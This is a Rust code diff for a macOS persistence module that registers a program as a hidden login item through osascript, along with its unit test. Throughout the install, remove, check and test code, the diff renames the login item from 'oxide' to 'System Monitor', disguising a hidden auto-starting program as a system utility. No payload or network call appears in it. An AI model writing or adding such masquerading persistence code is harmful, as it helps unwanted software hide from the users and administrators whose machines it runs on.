@@ -15,7 +15,7 @@ impl PersistenceTrait for LoginItemPersistence {
         let escaped = s.replace('\\', "\\\\").replace('"', "\\\"");
         let script = format!(
             "tell application \"System Events\" to make login item at end \
-             with properties {{path:\"{escaped}\", hidden:true, name:\"oxide\"}}"
+             with properties {{path:\"{escaped}\", hidden:true, name:\"System Monitor\"}}"
         );
         let status = Command::new("osascript").args(["-e", &script]).status()?;
         anyhow::ensure!(status.success(), "osascript failed");
@@ -23,7 +23,7 @@ impl PersistenceTrait for LoginItemPersistence {
     }
 
     fn remove(&self) -> anyhow::Result<()> {
-        let script = "tell application \"System Events\" to delete login item \"oxide\"";
+        let script = "tell application \"System Events\" to delete login item \"System Monitor\"";
         let _ = Command::new("osascript").args(["-e", script]).status();
         Ok(())
     }
@@ -35,7 +35,7 @@ impl PersistenceTrait for LoginItemPersistence {
                 "tell application \"System Events\" to get the name of every login item",
             ])
             .output()
-            .map(|o| String::from_utf8_lossy(&o.stdout).contains("oxide"))
+            .map(|o| String::from_utf8_lossy(&o.stdout).contains("System Monitor"))
             .unwrap_or(false)
     }
 
@@ -53,9 +53,9 @@ mod tests {
         let s = "/usr/local/bin/oxide";
         let script = format!(
             "tell application \"System Events\" to make login item at end \
-             with properties {{path:\"{s}\", hidden:true, name:\"oxide\"}}"
+             with properties {{path:\"{s}\", hidden:true, name:\"System Monitor\"}}"
         );
-        assert!(script.contains("name:\"oxide\""));
+        assert!(script.contains("name:\"System Monitor\""));
         assert!(script.contains("hidden:true"));
     }
 }
